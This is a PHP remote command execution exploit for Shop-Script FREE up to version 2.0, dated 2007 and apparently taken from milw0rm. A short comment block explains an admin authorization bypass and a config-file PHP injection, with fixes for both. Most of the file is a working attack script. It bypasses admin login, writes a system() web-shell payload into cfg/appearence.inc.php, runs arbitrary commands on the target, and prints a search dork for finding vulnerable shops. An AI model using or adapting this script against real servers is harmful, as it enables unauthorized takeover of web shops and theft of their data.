<?php
## Shop-Script FREE <= 2.0 Remote Command Execution Exploit by InATeam
## tested on versions 1.2 and 2.0
## works regardless magic_quotes_gpc=on
## Greetz: eXp, Kuzya, cxim, Russian, ENFIX

echo "--------------------------------------------------------\n";
echo "Shop-Script FREE <= 2.0 Remote Command Execution Exploit\n";
echo "(c)oded by Raz0r, InATeam (InAttack.Ru)\n";
echo "dork: \"Powered by Shop-Script FREE\"\n";
echo "--------------------------------------------------------\n";

if ($argc<2) {
echo "USAGE:\n";
echo "~~~~~~\n";
echo "php {$argv[0]} [url] [cmd]\n\n";
echo "[url] - target server where Shop-Script FREE is installed\n";
echo "[cmd] - command to execute\n\n";
echo "e.g. php {$argv[0]} http://site.com/shop/ \"ls -la\"\n";
echo "     php {$argv[0]} http://shop.site.com:8080/ \"cat 
cfg/connect.inc.php\"\n";
die;
}
/**
 * software site: http://shop-script.com/
 *
 * i) admin authorization bypass
 * vulnerable code in admin.php near lines 37-41:
 * ------------------[source code]----------------------
 * if (!isset($_SESSION["log"]) || !isset($_SESSION["pass"])) //unauthorized
 *   {
 *       //show authorization form
 *       header("Location: access_admin.php");
 *   }
 * ------------------[/source code]---------------------
 * unathorized user wiil be redirected to the page with the auth form but the script will continue running.
 * So, admin panel can be accessed by ignoring "Location" header. Solution:
 * ------------------[source code]----------------------
 * if (!isset($_SESSION["log"]) || !isset($_SESSION["pass"])) //unauthorized
 *   {
 *       //show authorization form
 *       header("Location: access_admin.php");
 *       die;
 *   }
 * ------------------[/source code]---------------------
 * ii) arbitrary php code injection
 * vulnerable code in /includes/admin/sub/conf_appearence.php near lines 29-38:
 * ------------------[source code]----------------------
 * $f = fopen("./cfg/appearence.inc.php","w");
 * fputs($f,"<?php\n\tdefine('CONF_PRODUCTS_PER_PAGE', '".str_replace("'","\'",stripslashes($_POST["productscount"]))."');\n");
 * fputs($f,"\tdefine('CONF_COLUMNS_PER_PAGE', '".str_replace("\\\"","\"",$_POST["colscount"])."');\n");
 * ...
 * fputs($f,"\tdefine('CONF_LIGHT_COLOR', '".str_replace("\\\"","\"",$_POST["lightcolor"])."');\n?>");
 * fclose($f);
 * ------------------[/source code]---------------------
 * specially formed POST data will break the config file's structure. So, it is possible to inject
 * arbitrary php code in /cfg/appearence.inc.php. Solution: filtering backslash and single quote characters.
 */
error_reporting(0);
set_time_limit(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",10);

$url = $argv[1];
$cmd = $argv[2];
$url_parts = parse_url($url);
$host = $url_parts['host'];
$path = $url_parts['path'];
if (isset($url_parts['port'])) $port = $url_parts['port']; else $port = 80;
$packet ="GET {$path}admin.php?dpt=conf&sub=appearence HTTP/1.0\r\n";
$packet.="Host: {$host}\r\n";
$packet.="User-Agent: InAttack evil agent\r\n";
$packet.="Connection: close\r\n\r\n";
$resp = send($packet);
echo "[~] Connecting to $host...";
$resp ? print(" OK\n") : die(" failed");
$inputnames=array("productscount","colscount","darkcolor","middlecolor","lightcolor","add2cart","bestchoice");
$matches=array();
foreach($inputnames as $input) {
    if (preg_match('@<input type=text name='.$input.' value="([^"]*)">@',$resp,$matches)) $inputvalues[$input] = urlencode($matches[1]);
    elseif (preg_match('@<input type=checkbox name='.$input.' checked>@',$resp,$matches)) $inputvalues[$input] = "on";
}
if (!isset($inputvalues) || sizeof($inputvalues)==0) die("[-] Exploit failed");
echo "[~] Sending shellcode...";
$data = makedata(1);
$packet = "POST {$path}admin.php HTTP/1.0\r\n";
$packet.= "Host: $host\r\n";
$packet.= "User-Agent: InAttack evil agent\r\n";
$packet.= "Content-Length: ".strlen($data)."\r\n";
$packet.= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet.= "Connection: keep-alive\r\n\r\n";
$packet.= $data;
$resp = send($packet);
$resp ? print(" OK\n") : die(" failed");
echo "[~] Executing command...";
$packet ="GET {$path}index.php?cmd=".urlencode($cmd)." HTTP/1.0\r\n";
$packet.="Host: {$host}\r\n";
$packet.="User-Agent: InAttack evil agent\r\n";
$packet.="Connection: close\r\n\r\n";
$resp = send($packet);
$matches=array();
if (!preg_match('@InAttack(.*?)InAttack@s',$resp,$matches))echo("failed\n");
else (($result = $matches[1]) == 's4f3_m0d3') ? print(" failed\n[-] 
Safe_mode=On\n") : (($result == 'd1s4bl3d') ? print(" failed\n[-] 
system() is disabled\n") : printf(" OK\n%'-56s\n%s%'-56s\n",'',$result,''));
echo "[~] Restoring values...";
$data = makedata();
$packet = "POST {$path}admin.php HTTP/1.0\r\n";
$packet.= "Host: $host\r\n";
$packet.= "User-Agent: InAttack evil agent\r\n";
$packet.= "Content-Length: ".strlen($data)."\r\n";
$packet.= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet.= "Connection: keep-alive\r\n\r\n";
$packet.= $data;
$resp = send($packet);
$resp ? print(" OK\n") : die(" failed");

function send($packet) {
    global $host,$port;
    $ock = @fsockopen(@gethostbyname($host),$port);
    if (!$ock) return false;
    else {
        fputs($ock, $packet);
        $html='';
        while (!feof($ock)) $html.=fgets($ock);
    }
    return $html;
}

function makedata($modifyvalues=0) {
    global $inputvalues;
    $shellcode = '\');if(!empty($_GET["cmd"])&&!defined("INA")){echo"InAttack";if(!ini_get("safe_mode")){if(strpos(ini_get("disable_functions"),"system")===false){$c=$_GET["cmd"];if(get_magic_quotes_gpc()){$c=stripslashes($c);}system($c);}else{echo"d1s4bl3d";}}else{echo"s4f3_m0d3";}echo"InAttack";define("INA",true);}//';
    $data = "dpt=conf&";
    $data.= "sub=appearence&";
    $data.= "save_appearence=1&";
    $data.= "productscount={$inputvalues['productscount']}";
    if ($modifyvalues==1) $data.=urlencode("\\".$shellcode)."&"; else $data.="&";
    $data.= "colscount={$inputvalues['colscount']}";
    if ($modifyvalues==1) $data.=urlencode($shellcode)."&"; else $data.="&";
    $data.= "darkcolor={$inputvalues['darkcolor']}";
    if ($modifyvalues==1) $data.=urlencode("\\\\".$shellcode)."&"; else $data.="&";
    $data.= "middlecolor={$inputvalues['middlecolor']}&";
    $data.= "lightcolor={$inputvalues['lightcolor']}&";
    $data.= "add2cart={$inputvalues['add2cart']}&";
    $data.= "bestchoice={$inputvalues['bestchoice']}";
    return $data;
}
## EOF
?>

# milw0rm.com [2007-09-17]
